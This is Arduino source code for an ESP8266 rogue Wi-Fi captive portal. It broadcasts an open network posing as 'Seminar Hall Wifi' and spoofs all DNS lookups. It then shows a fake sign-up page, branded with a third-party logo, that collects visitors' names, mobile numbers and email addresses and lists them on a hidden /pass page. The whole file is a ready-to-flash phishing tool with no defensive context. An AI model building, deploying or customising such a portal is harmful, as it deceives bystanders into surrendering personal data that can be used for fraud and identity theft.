// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "Seminar Hall Wifi"
#define SUBTITLE "Welcome Free Wi-Fi service.<br> You can enjoy 60 Minutes of free Wi-Fi"
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 1 minute for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials="";
unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { return 
  "</div><div class=q><a>&#169; All rights reserved by Riglabs Collective.</a></div>";
}

String header(String t) {
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }"
    // Added styles for the front-end design
    ".container { display: flex; height: 100vh; }"
    ".left-side { background-color: #4b0082; width: 50%; display: flex; align-items: center; justify-content: center; color: #fff; }"
    ".left-side img { max-width: 100%; height: auto; }"
    ".right-side { width: 50%; display: flex; align-items: center; justify-content: center; }"
    ".login-form { max-width: 400px; width: 100%; padding: 20px; border: 1px solid #ccc; border-radius: 10px; }"
    ".login-form h1 { margin-bottom: 20px; }"
    ".login-form input { margin-bottom: 10px; }"
    ".login-form button { width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }"
    ".login-form a { display: block; margin-top: 10px; text-align: center; color: #0066ff; }";
  String h = String("<!DOCTYPE html><html>") +
    "<head><title>" + String(SSID_NAME) + " :: " + t + "</title>" +
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">" +
    "<style>" + CSS + "</style></head>" +
    "<body><div class='container'><div class='left-side'><img src='https://pimwp.s3-accelerate.amazonaws.com/2024/11/Logo.jpg/300x300' alt='SP Medifort'></div><div class='right-side'><div class='login-form'><h1>" + t + "</h1>";
  return h; }

String creds() {
  String content = "<ol>" + Credentials + "</ol>";
  if (content.length() == 4) { // Check if there are no credentials
    content = "<p>No credentials saved.</p>";
  }
  return header(PASS_TITLE) + content + "<br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<label for='name'>Name:</label><input type=text autocomplete=off name=name id='name'>" +
    "<label for='mobile'>Mobile Number:</label><input type=text autocomplete=off name=mobile id='mobile'>" +
    "<label for='email'>Mail ID:</label><input type=text autocomplete=off name=email id='email'>"  + footer();
}

String posted() {
  String name = input("name");
  String mobile = input("mobile");
  String email = input("email");  // Process the email input
  // Store name, mobile, and email in Credentials
  Credentials += "<li>Name: <b>" + name + "</b><br>Mobile: <b>" + mobile + "</b><br>Email: <b>" + email + "</b></li>";  // Added email to Credentials
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  Credentials = "";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</p></div><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {
  int count = 0;
  while(count < 5){
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() { 
  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
  dnsServer.processNextRequest(); 
  webServer.handleClient(); 
}
